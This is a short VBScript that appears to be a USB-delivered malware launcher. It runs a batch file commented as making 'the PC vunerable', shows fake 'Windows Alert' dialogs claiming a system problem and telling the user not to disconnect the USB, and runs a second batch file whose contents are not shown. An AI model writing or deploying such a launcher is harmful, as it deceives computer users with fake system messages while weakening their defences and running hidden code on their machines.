DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )
Set FSO = CreateObject("Scripting.FileSystemObject")



''' Make the PC vunerable
CreateObject("Wscript.Shell").Run """Disable.bat""", 1, True

''' Alert Box
z=MsgBox("Windows ran into a problem.", 0+64, "Windows Alert!!!")
WScript.Sleep(1)
CreateObject("Wscript.Shell").Run """file.bat""", 1, True

a=MsgBox("RUnning... do not dissconect USB", 0+64, "Windows Alert!!!")
